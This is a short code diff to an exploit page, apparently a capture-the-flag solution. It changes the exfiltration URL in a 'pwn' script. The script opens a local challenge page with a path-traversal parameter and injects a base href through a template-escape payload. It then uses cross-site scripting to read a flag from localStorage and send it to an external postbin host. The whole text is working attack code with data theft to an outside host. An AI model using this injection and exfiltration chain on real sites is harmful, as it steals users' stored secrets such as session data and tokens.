@@ -4,7 +4,7 @@
         <script>
             const sleep = (m) => new Promise(r => setTimeout(r, m));
             const pwn = async () => {
-                let href = `/x/;window.parent.open('https://www.toptal.com/developers/postbin/1661918257442-1312295382376?flag='+JSON.parse(localStorage.saved).Default.flag);//`.replaceAll(';', encodeURIComponent(';'));
+                let href = `/x/;window.parent.open('https://www.toptal.com/developers/postbin/1661918482008-8742951806634?flag='+JSON.parse(localStorage.saved).Default.flag);//`.replaceAll(';', encodeURIComponent(';'));
                 let card = `debug=</template><base href="${href}" /><template>`;
                 let w = window.open("http://localhost/?card=..%252f..%252f..%252f..%252f..%252f..%252f/B00TK1D/xss/main/test1.ae");
                 await sleep(1500);
